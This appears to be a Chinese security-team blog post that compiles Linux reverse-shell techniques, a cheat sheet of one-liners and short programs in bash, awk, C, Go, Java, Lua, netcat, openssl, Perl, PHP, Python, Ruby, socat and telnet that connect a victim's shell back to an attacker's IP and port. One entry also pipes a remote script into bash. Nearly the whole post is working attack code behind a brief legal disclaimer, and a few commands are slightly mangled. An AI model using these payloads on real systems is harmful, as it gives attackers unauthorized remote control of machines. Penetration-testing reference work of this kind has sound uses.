#  Linux 反弹shell   
原创 R0seK1ller  蟹堡安全团队   2024-11-18 00:54  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/zicSF5UibGP2soZQvhWHibEDgwAMO56qbHib5oMIfAhkibufdic45TJH8rIIFSLJTgaOyQbdicEtbwnlvcmA2icRehicVOw/640?wx_fmt=gif&from=appmsg "")  
  
  
免责声明  
   
  
      蟹堡安全团队的技术文章仅供参考，任何个人和组织在使用网络时应当遵守相关法律法规，不得利用网络从事危害国家安全、荣誉和利益的活动。未经授权，请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，蟹堡安全团队及文章作者不承担任何责任。本文所提供的工具仅用于学习，禁止用于其他用途！  
  
	  
    搜集了一部分Get System Shell的方法。  
  
**01**  
  
  
**AWK**  
  
> awk 'BEGIN{s="/inet/tcp/0/[: ip]/[: port]";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'  
  
  
  
**02**  
  
  
**Bash**  
  
  
> bash -i >& /dev/tcp/[: ip]/[: port] 0>&1  
  
  
  
****  
**03**  
  
  
**curl**  
  
##     Curl 远程加载恶意文件的原理本质上还是通过其他反弹shell的方式实现的，只是通过curl从远程获取恶意脚本并执行了，这样可以延缓文件真正落地时间。  
> curl http://[: host]:[: port]/[: evil_filename] | bash  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zULPOPl8mKfRzbQcANBvF2ygaZ2P6jVZ2vLvGDgf4ibT59sR39HN32UZrgDCxpN2kNcvajZnMg750A/640?wx_fmt=png&from=appmsg "")  
  
****  
**04**  
  
  
**exec**  
  
##   
> exec 5<>/dev/tcp/[: ip]/[: port];cat <&5 | while read line; do $line 2>&5 >&5; done  
  
  
	  
创建一个文件描述符，指向TCP连接的socket，将文件描述符指代对象的输出流向cat命令，将stdin作为文件描述符指代对象的输入。  
> exec 196<>/dev/tcp/[: ip]/[: port]; exec 2>&0 0<&196;bash <&196 >&196 2>&196  
  
  
**05**  
  
  
**Gawk**  
  
> gawk 'BEGIN{s="/inet/tcp/0/[: ip]/[: port]";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}  
  
  
  
**06**  
  
  
**GCC**  
  
```
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>
#include <dirent.h>
#include <sys/stat.h>

int tcp_port = [: port];
char *ip = "[: ip]";

void reverse_shell(){
        int fd;
        if ( fork() <= 0){
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(tcp_port);
                addr.sin_addr.s_addr = inet_addr(ip);

                fd = socket(AF_INET, SOCK_STREAM, 0);
                if ( connect(fd, (struct sockaddr*)&addr, sizeof(addr)) ){
                        exit(0);
                }

                dup2(fd, 0);
                dup2(fd, 1);
                dup2(fd, 2);
                execve("/bin/bash", 0LL, 0LL);
        }
        return;
}

int main(int argc, char const *argv[])
{
        reverse_shell();
        return 0;
}
```  
```
```  
  
	  
    使用gcc直接编译一下，编译之前需要修改代码中的tcp_port和ip参数所对应的数值。编译完成后直接运行即可。  
> gcc test.c -o test  
> ./test  
  
  
  
**07**  
  
  
**Go**  
  
  
##     在《攻防|反弹shell方式汇总》[1]中提供了一个好用的github项目，但是在这里只是需要简单的验证可行性，所以就简单的用他文中提到的代码进行验证即可。  
```
package main
import (
    "net"       // requirement to establish a connection
    "os"        // requirement to call os.Exit()
    "os/exec"   // requirement to execute commands against the target system
)
func main() {
    conn, err := net.Dial("tcp", "[: ip]:[: port]")
    if err != nil {
        os.Exit(1)
    }
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.Run()
}
```  
```
```  
> 编译Go文件  
> go build ReverseShell.go  
> 执行编译后的二进制文件  
> ./ReverseShell  
  
  
  
**08**  
  
  
**Java**  
  
##   
```
public class Test {
    public static void main(String[] args) throws Exception {
        Runtime r = Runtime.getRuntime();
        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/[: ip]/[: port];cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
    }
}
```  
```
```  
> javac classname.java  
> java classname  
  
  
  
**09**  
  
  
**Lua**  
  
> lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('[: ip]',[: port]);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"  
  
  
> lua -e "local socket=require('socket');local os=require('os');t=socket.tcp();t:connect('[: ip]',[: port]);os.execute('/bin/sh -i <&3 >&3 2>&3');"  
  
  
    Lua在反弹Shell的过程中需要使用到socket，这就需要下载luasocket这个库，我才用的是源码编译安装，  
```
git clone https://github.com/diegonehab/luasocket.git
cd luasocket
make
sudo make install
```  
```
```  
  
	  
也可以采用luarocks 这个Lua包管理工具进行安装。  
> luarocks install luasocket  
  
  
  
**10**  
  
  
**nc**  
  
  
> nc [: ip] [: port]-c /bin/bash  
  
  
	  
    如果Linux上原装的nc没有-c/-e参数，可以尝试上文《netcat-traditional安装》相关内容尝试解决。  
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [: ip] [: port] >/tmp/f  
  
  
> nc [: ip] [: port] | /bin/bash | nc [: ip] [: port]  
  
  
	  
    这里输入的两组ip和port组合必须是不同的，前一个nc对应的连接用来接受命令，后一个nc对应的连接用来显示命令。  
> mknod backpipe p && nc [host] [port] 0<backpipe | /bin/bash 1>backpipe  
  
  
  
**11**  
  
  
**Openssl**  
  
  
    OpenSSL 是一个开源的软件库，它提供了一个强大的通用加密库，实现了 SSL（Secure Sockets Layer）和 TLS（Transport Layer Security）协议。  
OpenSSL 是网络安全中不可或缺的一部分，广泛应用于 Web 服务器、电子邮件、即时通讯、VPN 和许多其他需要安全通信的场景。  
由于其广泛的应用和重要性，保持 OpenSSL 的更新和安全配置是非常重要的，以防止已知漏洞和安全风险。  
### 1. 生成自签名证书  
> openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes  
  
  
-keyout key.key:生成私钥  
  
  
-out cert.pem：生成pem证书  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zULPOPl8mKfRzbQcANBvF2yVLgiacY4F0j4yKsibZib1Xicl2PIowmgDvibtfdoyhBYhbzOT7JchFfjc4w/640?wx_fmt=png&from=appmsg "")  
### 2. (攻击者)服务端监听端口  
> openssl s_server -quiet -key key.pem -cert cert.pem -port 1337  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zULPOPl8mKfRzbQcANBvF2yPiawb7mryfdodW6X71eQW4Vw19QRUm5OmlZz7XhFHumx8F0zibrA8y8Q/640?wx_fmt=png&from=appmsg "")  
### 3. 使用mkfifo进行反弹shell(使用openssl单向认证)  
> rm -f /tmp/s;mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.70.157:1337 > /tmp/s; rm -f /tmp/s  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zULPOPl8mKfRzbQcANBvF2yk74SibdiaW4gdYo6zBf4ib3fdKicPKOPJ6bMf7HpWfJIUPbcIKcE0asvCQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zULPOPl8mKfRzbQcANBvF2yDes4BX9FeVMiaOhiacaY9gLsXbvJvQFJrxPaA6nd1F30mfFTwkiaUNcRw/640?wx_fmt=png&from=appmsg "")  
  
****  
**12**  
  
  
**Perl**  
  
  
	  
    依靠/bin/bash  
> perl -e 'use Socket;$i="192.168.70.157";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'  
  
  
	  
    不依靠/bin/bash（5.10之前）  
> perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.70.157:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'  
  
  
	  
    不依靠/bin/bash（5.10之后）  
> perl -MIO::Socket::INET -e '$p=fork; exit, if $p; $c=new IO::Socket::INET(PeerAddr,"192.168.70.157:4444"); STDIN->fdopen($c,r); STDOUT->fdopen($c,w); system$_ while<>;'  
  
  
     
  
**13**  
  
  
**PHP**  
  
  
> php -r '$sock=fsockopen("[: ip]",[: port]);exec("/bin/bash -i <&3 >&3 2>&3");'  
  
  
> <  
?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [: ip] [: port]>/tmp/f"); ?>  
  
##   
  
**14**  
  
  
**Python**  
  
##     Python 反弹shell  
> python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[: ip]',  [: port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"  
  
  
```
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('[: ip]', [: port]))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/bash','-i']);
```  
```
```  
  
  
**15**  
  
  
**Ruby**  
  
  
****> ruby -rsocket -e'f=TCPSocket.open("[: ip]",[: port]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'  
  
  
> ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[: ip]","[: port]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'  
  
  
    摘抄msf中GET shell 部分代码。  
```
#!/usr/bin/env ruby

require 'socket'
require 'open3'

#Set the Remote Host IP
RHOST = "[: ip]" 
#Set the Remote Host Port
PORT = "[: port]"

#Tries to connect every 20 sec until it connects.
begin
sock = TCPSocket.new "#{RHOST}", "#{PORT}"
sock.puts "We are connected!"
rescue
  sleep 20
  retry
end

#Runs the commands you type and sends you back the stdout and stderr.
begin
  while line = sock.gets
    Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
              IO.copy_stream(stdout_and_stderr, sock)
              end  
  end
rescue
  retry
end
```  
```
```  
> 运行ruby文件  
> ruby [: filename]  
  
  
  
**16**  
  
  
**Socat**  
  
  
  
	  
    socat是一个跨平台数据传输工具，它提供了一个为应用程序之间的数据交换提供可靠、双向的连接的功能。在linux系统中，socat可以用于网络、文件系统、终端、串口等多种不同的通讯方式中。它的使用方法十分灵活，可以实现各种多样的连接方式，包括TCP、UDP、HTTP、FTP等等，它可以被用来实现文本转换、转发功能、与不同协议之间的通信等。  
  
	  
    发送TCP请求数据:  
> socat tcp-connect:[: ip]:[: port]exec:'bash -li',pty,stderr,setsid,sigint,sane  
  
  
	  
    发送UDP请求数据:  
> socat udp-connect:[: ip]:[: port]exec:'bash -li',pty,stderr,sane 2>&1>/dev/null &  
  
  
	  
    远端通过NC接受UDP请求时，需要用到下面的命令:  
> nc -lup 4444  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zULPOPl8mKfRzbQcANBvF2yE67WfYibJ5HXZRs4ld2JicdBw4l6pDJlhUnWuGnU8gas77YfuzPvHfRQ/640?wx_fmt=png&from=appmsg "")  
  
****  
**16**  
  
  
**Telnet**  
  
  
> mknod backpipe p && telnet [: ip] [: port] 0<backpipe | /bin/bash 1>backpipe  
  
  
> cmdrm -f /tmp/p; mknod /tmp/p p && telnet [: ip] [: port]0/tmp/p  
  
  
## 参考  
  
[1]   
[https://mp.weixin.qq.com/s/iNCcx2KqriRoBfcKQ0zxLg](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650591330&idx=3&sn=01457fd8f4b9571c77a6158b90bbb7ba&scene=21#wechat_redirect)  
  
  
  
  
  
  
